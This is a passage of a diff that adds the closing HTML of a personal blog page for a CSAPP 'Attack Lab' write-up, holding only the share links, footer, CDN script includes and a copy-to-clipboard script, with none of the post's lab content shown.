+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/[CSAPP-Lab]%20Attack%20Lab.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/[CSAPP-Lab]%20Attack%20Lab.html&text=Attack Lab"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/[CSAPP-Lab]%20Attack%20Lab.html&title=Attack Lab"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/[CSAPP-Lab]%20Attack%20Lab.html&is_video=false&description=Attack Lab"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Attack Lab&body=Check out this article: http://kelpie.top/post/[CSAPP-Lab]%20Attack%20Lab.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/[CSAPP-Lab]%20Attack%20Lab.html&title=Attack Lab"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/[CSAPP-Lab]%20Attack%20Lab.html&title=Attack Lab"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/[CSAPP-Lab]%20Attack%20Lab.html&title=Attack Lab"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/[CSAPP-Lab]%20Attack%20Lab.html&title=Attack Lab"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/[CSAPP-Lab]%20Attack%20Lab.html&name=Attack Lab&description=&lt;p&gt;The attack lab is a good way to start the CTF PWN. It contains the basic attack ways stack execution and ROP.&lt;br&gt;If you have not been into PWN world, this lab will lead you to a new world.&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/[CSAPP-Lab]%20Attack%20Lab.html&t=Attack Lab"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    l3vi4th4n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
